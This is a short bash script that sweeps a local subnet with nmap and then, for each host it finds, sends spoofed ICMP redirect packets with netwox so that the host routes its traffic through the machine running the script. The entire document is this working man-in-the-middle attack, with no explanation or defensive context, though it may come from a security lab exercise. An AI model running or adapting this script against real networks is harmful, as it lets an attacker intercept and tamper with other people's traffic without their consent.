#!/bin/bash
 
myIp=$(hostname -I | awk '{print $1}')
printf "my ip %s\n" "$myIp"
mapfile -t nmapOutput < <(nmap -sP 192.168.100.0/24 | awk '/Nmap scan report/{print $NF}')
 
printf "%s hosts up\n" "${#nmapOutput[*]}"
 
for ip in "${nmapOutput[@]}"
do
    if [ "$myIp" != "$ip" ]; then
        printf "Trying %s ...\n"  "$ip"
        filterValue="src host "$ip
        echo $filterValue
    
    timeout 15s netwox 86 --device "eth0" --filter "$filterValue" --gw $myIp --spoofip "raw" --code 0
    fi
done
 
